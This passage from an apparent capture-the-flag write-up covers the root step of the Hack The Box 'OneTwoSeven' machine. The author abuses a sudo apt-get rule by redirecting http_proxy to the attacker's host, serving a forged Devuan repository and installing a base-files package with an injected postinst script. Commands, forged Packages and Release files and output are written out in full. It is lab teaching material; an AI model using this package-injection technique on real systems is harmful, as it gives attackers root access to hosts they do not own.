@@ -465,4 +465,302 @@ User www-admin-data may run the following commands on onetwoseven:
     (ALL : ALL) NOPASSWD: /usr/bin/apt-get update, /usr/bin/apt-get upgrade
 ```
 
+Very nice, we can run **/usr/bin/apt-get update** and **/usr/bin/apt-get upgrade** commands with root privileges. That's okay. So, we have to inject something to these commands. This part was pretty tricky for me. I read two articles for this part and I will share these articles at end of this blog post. You should read both of these articles. They contains very cool tricks.
+
+If you check output of **sudo -l** command, you can see that there are some environment variables are usable for setting your local machine as proxy server. These are:
+
++ ftp_proxy
++ http_proxy
++ https_proxy
++ no_proxy
+
+Before using these variables, I decided to enumerate **apt repositories** on the machine.
+
+We can check these repository list with reading **sources.list** file which in **/etc/apt** directory.
+
+```cat /etc/apt/sources.list```
+
+```
+# deb cdrom:[devuan_ascii_2.0.0_amd64_netinst]/ ascii main non-free
+
+#deb cdrom:[devuan_ascii_2.0.0_amd64_netinst]/ ascii main non-free
+
+deb http://de.deb.devuan.org/merged ascii main
+# deb-src http://de.deb.devuan.org/merged ascii main
+
+deb http://de.deb.devuan.org/merged ascii-security main
+# deb-src http://de.deb.devuan.org/merged ascii-security main
+
+deb http://de.deb.devuan.org/merged ascii-updates main
+# deb-src http://de.deb.devuan.org/merged ascii-updates main
+```
+
+Some of these lines are commented out. If we run **apt-get update** command, probably machine will try to connect that host. Then, it will try to find differences between installed application list and target package list. After reading that post, I figured out how it finds the differences.
+
+All of these files are stored as **.deb** format in repository. Also, repositores have some other files for package controlling. If you want to update an application, then you must summarize that **.deb** package file in three different hash format. These are:
+
++ MD5
++ SHA1
++ SHA256
+
+After doing checksum operation, you have to replace these hash values with hashes on the latest version of that **Packages** file. It is really necessary. Because, if you want to upgrade an application, it will compare hash values on **Packages** file with  hash values on **.deb** package file. If hash values don't match, then upgrading process fails. 
+
+Also, you have to compress the **Packages** file as **.gz** format. After compressing that file, you must do another checksum process for both of these **Packages** and **Packages.gz** files. These hash values will be stored on **Release** file. **Release** file stores all of these **Packages** files that belongs to other **deb** applications. Therefore, **Release** file are stored in top of these repositories. Basically it stores another **Packages** files and **Packages** files stores hashes of **.deb** packages. Another detail with repositories is sometimes that **Release** files can be signed with **key** of authority of repository. It was a small briefing about how repositories works.
+
+Okay, we got it. Let's start with executing the *update* command.
+
+
+```sudo /usr/bin/apt-get update```
+
+```
+Err:1 http://packages.onetwoseven.htb/devuan ascii InRelease
+  Temporary failure resolving 'packages.onetwoseven.htb'
+Err:2 http://de.deb.devuan.org/merged ascii InRelease
+  Temporary failure resolving 'de.deb.devuan.org'
+Err:3 http://de.deb.devuan.org/merged ascii-security InRelease
+  Temporary failure resolving 'de.deb.devuan.org'
+Err:4 http://de.deb.devuan.org/merged ascii-updates InRelease
+  Temporary failure resolving 'de.deb.devuan.org'
+Reading package lists... Done
+W: Failed to fetch http://de.deb.devuan.org/merged/dists/ascii/InRelease  Temporary failure resolving 'de.deb.devuan.org'
+W: Failed to fetch http://de.deb.devuan.org/merged/dists/ascii-security/InRelease  Temporary failure resolving 'de.deb.devuan.org'
+W: Failed to fetch http://de.deb.devuan.org/merged/dists/ascii-updates/InRelease  Temporary failure resolving 'de.deb.devuan.org'
+W: Failed to fetch http://packages.onetwoseven.htb/devuan/dists/ascii/InRelease  Temporary failure resolving 'packages.onetwoseven.htb'
+W: Some index files failed to download. They have been ignored, or old ones used instead.
+```
+
+As you see, connection failed. Just inspect that output more careful. At first error there is another package repository.
+
+> packages.onetwoseven.htb
+
+If you try to connect these repositories from your browser, you can see that the one which starts with **package** fails. Because your browser won't recognize that hostname. Other one will redirect to another URL.
+
+> deb.devuan.org
+
+![redirect path]({{site.url}}/assets/images/onetwoseven/redirect_path.png)
+
+Somehow, we should make that connection possible on target machine. We know that there are some environment variables which can help at this point. 
+
+```export http_proxy=http://10.10.15.127```
+
+Now, it's time to test it.
+
+> sudo /usr/bin/apt-get update
+
+```
+Err:1 http://packages.onetwoseven.htb/devuan ascii InRelease
+  Could not connect to 10.10.15.127:80 (10.10.15.127). - connect (111: Connection refused)
+Err:2 http://de.deb.devuan.org/merged ascii InRelease
+  Could not connect to 10.10.15.127:80 (10.10.15.127). - connect (111: Connection refused)
+Err:3 http://de.deb.devuan.org/merged ascii-security InRelease
+  Unable to connect to 10.10.15.127:http:
+Err:4 http://de.deb.devuan.org/merged ascii-updates InRelease
+  Unable to connect to 10.10.15.127:http:
+Reading package lists... Done
+W: Failed to fetch http://de.deb.devuan.org/merged/dists/ascii/InRelease  Could not connect to 10.10.15.127:80 (10.10.15.127). - connect (111: Connection refused)
+W: Failed to fetch http://de.deb.devuan.org/merged/dists/ascii-security/InRelease  Unable to connect to 10.10.15.127:http:
+W: Failed to fetch http://de.deb.devuan.org/merged/dists/ascii-updates/InRelease  Unable to connect to 10.10.15.127:http:
+W: Failed to fetch http://packages.onetwoseven.htb/devuan/dists/ascii/InRelease  Could not connect to 10.10.15.127:80 (10.10.15.127). - connect (111: Connection refused)
+W: Some index files failed to download. They have been ignored, or old ones used instead.
+```
+
+Good, there are some changes on the output. Probably, it is trying to connect our *http* service. Let's deceive it with running **SimpleHTTPServer** on local machine.
+
+```python2 -m SimpleHTTPServer 80```
+
+```
+Serving HTTP on 0.0.0.0 port 80 ...
+10.10.10.133 - - [10/Jun/2019 00:32:09] code 404, message File not found
+10.10.10.133 - - [10/Jun/2019 00:32:09] "GET http://packages.onetwoseven.htb/devuan/dists/ascii/InRelease HTTP/1.1" 404 -
+10.10.10.133 - - [10/Jun/2019 00:32:09] code 404, message File not found
+10.10.10.133 - - [10/Jun/2019 00:32:09] "GET http://de.deb.devuan.org/merged/dists/ascii/InRelease HTTP/1.1" 404 -
+
+.... other lines ....
+
+10.10.10.133 - - [10/Jun/2019 00:32:09] code 404, message File not found
+10.10.10.133 - - [10/Jun/2019 00:32:09] "GET http://packages.onetwoseven.htb/devuan/dists/ascii/main/binary-amd64/Packages.xz HTTP/1.1" 404 -
+```
+
+Basically, it is trying to fetch some files but these files are not stored in there. We have to build something bigger. Maybe, we should create our personal repositores with given hostnames.
+
+At first, we should edit **/etc/hosts** file. We should append these lines shown below.
+
+```
+127.0.0.1	packages.onetwoseven.htb
+127.0.0.1	de.deb.devuan.org
+```
+
+First step is done. Second step is creating these repositories. At that point, I created two different directories. Because **update** command is fetching update files from two different URLs.
+
+Here's the directory structure:
+
+![directory structure]({{site.url}}/assets/images/onetwoseven/directory_structure.png)
+
+If you check output of last update command, you will see that **packages.onetwoseven.htb** host is using **/devuan** directory and the other one is using **/merged** directory. We know that **de.deb.devuan.org** is real repository. But other one isn't real. So, we have to fetch same files from that repository for making it real. Then, I fetched these files with **wget** to merged directory. Okay, we are cool with the real one. 
+
+What about the fake one?
+
+The fake repository should be our injection directory. We have to find an application on target machine which belongs to **/devuan** repository. If we can find one, then we can inject code into debian application package.
+
+Ain't that cool? We are upgrading an application for real, then we are generating necessary release and packages files for it. Also, we are hiding our surprise for user. 
+
+Before finding that application, I removed some **Release** and **Packages** file on the real repository that we created. Because if update process can find any differences between repository and application list then it will try to upgrade these applications too. As a result, if these applications are not stored in **pool** list of repo then this process will fail. 
+
+Let's find my precioussss....
+
+```dpkg -l | grep 'devuan'```
+
+```
+ii  base-files                             9.9+devuan2.5                      all          Devuan base system miscellaneous files
+ii  bash-completion                        1:2.1-4.3+devuan1                  all          programmable completion for the bash shell
+ii  bsdutils                               1:2.29.2-1+devuan2.1               amd64        basic utilities from 4.4BSD-Lite
+ii  dbus                                   1.10.22-1+devuan2                  amd64        simple interprocess messaging system (daemon and utilities)
+ii  devuan-baseconf                        0.6.4+devuan2.3                    all          Devuan base config files
+
+...
+```
+
+From the results, I decided to select **base-files** application. Because I saw that this file is stored in that real repository. I downloaded deb package which has exact version of current installed app. 
+
+The real fun begins..
+
+```
+dpkg-deb -R base-files_9.9+devuan2.5_all.deb modified_base_files
+```
+
+With this command we are extracting files on the **.deb** file. After extracting it, we are navigating to **/DEBIAN** directory. Then, we are injecting our malicious code into **postinst** file. We selected this file because all of these lines will be executed while running **/usr/bin/apt-get upgrade** command.
+
+![postinst]({{site.url}}/assets/images/onetwoseven/postinst.png)
+
+By the way, I switched to *Kali Linux* at that point. Because, *deb* is not installed on my operating system. Also, we have to change version on **/DEBIAN/control** file. 
+
+![control file]({{site.url}}/assets/images/onetwoseven/control_file.png)
+
+After making these changes, we are repacking it.
+
+```
+dpkg-deb -b modified_base_files/ base-files_9.9+devuan2.6_all.deb
+```
+
+Cool! We have still some works to do. Let's create **Packages**, **Packages.gz** and **Release** files.
+
+#### Packages file:
+
+```
+md5sum base*; sha1sum base*; sha256sum base*;
+```
+output:
+
+```
+4889411ad723b5c6d56c7c47ad381cb7  base-files_9.9+devuan2.6_all.deb
+338fc54417db2194e2023d721b065ad310fbe4cf  base-files_9.9+devuan2.6_all.deb
+06a21aa67d8afc106ac14f037a7b9adeabc04e35c09b5e96057dccc2bb8a3ee3  base-files_9.9+devuan2.6_all.deb
+```
+
+We have to save these hashes and file sizevalue to Packages file as shown as below.
+
+```
+Package: base-files
+Version: 9.9+devuan2.6
+Essential: yes
+Installed-Size: 368
+Maintainer: Evilham <devuan@evilham.com>
+Architecture: all
+Replaces: base, dpkg (<= 1.15.0), miscutils
+Provides: base
+Pre-Depends: awk
+Breaks: initscripts (<< 2.88dsf-13.3), sendfile (<< 2.1b.20080616-5.2~)
+Description: Devuan base system miscellaneous files
+ This package contains the basic filesystem hierarchy of a Devuan system, and
+ several important miscellaneous files, such as /etc/devuan_version,
+ /etc/host.conf, /etc/issue, /etc/motd, /etc/profile, and others, and the text
+ of several common licenses in use on Devuan systems.
+Description-md5: 7271d96af8aac4f5f37c86c0f2c8cda6
+Multi-Arch: foreign
+Section: admin
+Priority: required
+Filename: pool/DEVUAN/main/b/base-files/base-files_9.9+devuan2.6_all.deb
+Size: 68796
+MD5sum: 4889411ad723b5c6d56c7c47ad381cb7
+SHA1: 338fc54417db2194e2023d721b065ad310fbe4cf
+SHA256: 06a21aa67d8afc106ac14f037a7b9adeabc04e35c09b5e96057dccc2bb8a3ee3
+```
+
+#### Packages.gz file:
+
+```gzip Packages -c > Packages.gz```
+
+#### Release file:
+
+Let's gather hash values and filesizes.
+
+```md5sum Packages*; sha1sum Packages*; sha256sum Packages*;```
+
+output:
+
+```
+55bd31c447c782f4836ed2238a6b066f  Packages
+8def1f355c5154fe4150e821e57d8743  Packages.gz
+ce136bde8a0d91766104881735ae9d4ff40df125  Packages
+c3946b74c76880a4b71f147714bacbb2a47e112f  Packages.gz
+445ba0fe10fcf80433e1725bb80005b69a6946464c8760ad9063dd3b7e527a51  Packages
+776053770b7228e18baf41631c6c9c7c95c4d54d2edc9fca30f408f60b175ef4  Packages.gz
+```
+
+```ls -la | grep 'Packages*'```
+
+```
+-rw-r--r-- 1 root root  967 Haz  8 22:31 Packages
+-rw-r--r-- 1 root root  634 Haz  8 22:31 Packages.gz
+```
+
+We need to save hashes and filesize values of Packages and Packages.gz files into the Release file as shown as below:
+
+```
+Origin: Devuan
+Label: ascii
+Suite: ascii
+Version: 2.0.0
+Codename: ascii
+Date: Sat, 08 Jun 2019 01:27:04 UTC
+Valid-Until: Sat, 15 Jun 2019 01:27:04 UTC
+Architectures: alpha amd64 arm64 armel armhf hppa i386 ia64 mips mipsel powerpc ppc64el s390x sparc
+Components: main contrib non-free raspi beaglebone droid4 n900 n950 n9 sunxi exynos
+MD5Sum:
+ 55bd31c447c782f4836ed2238a6b066f 967 main/binary-amd64/Packages
+ 8def1f355c5154fe4150e821e57d8743 634 main/binary-amd64/Packages.gz
+SHA1:
+ ce136bde8a0d91766104881735ae9d4ff40df125 967 main/binary-amd64/Packages
+ c3946b74c76880a4b71f147714bacbb2a47e112f 634 main/binary-amd64/Packages.gz
+SHA256:
+ 445ba0fe10fcf80433e1725bb80005b69a6946464c8760ad9063dd3b7e527a51 967 main/binary-amd64/Packages
+ 776053770b7228e18baf41631c6c9c7c95c4d54d2edc9fca30f408f60b175ef4 634 main/Packages.gz
+```
+
+Everything is ready. So, we can start the show!
+
+Let's execute ```/usr/bin/apt-get update``` and ```/usr/bin/apt-get upgrade``` commands.
+
+![update]({{site.url}}/assets/images/onetwoseven/update.png)
+
+As you see, there is only one application is ready for upgrade.
+
+> base-files
+
+Connection received. But, **whoami**?
+
+![got root]({{site.url}}/assets/images/onetwoseven/got_root.png)
+
+> uid=0(root) gid=0(root) groups=0(root)
+
+As a result of long efforts, we finally achieved to root user. Second part was really hard for me. It took nearly 2 day for me. I read these articles. I tried to make it work. It was really long process. After working hard, I've reached to happy ending. Also, I scored 5 out of 10 as difficulty as user part. Difficulty of root part? Yeah, I scored 8 out of 10. It was the hardest machine I've ever solved.
+
+
+Thanks for reading.
+
+### Articles:
+
++ https://lsdsecurity.com/2019/01/linux-privilege-escalation-using-apt-get-apt-dpkg-to-abuse-sudo-nopasswd-misconfiguration/
++ https://versprite.com/blog/apt-mitm-package-injection/
+
 
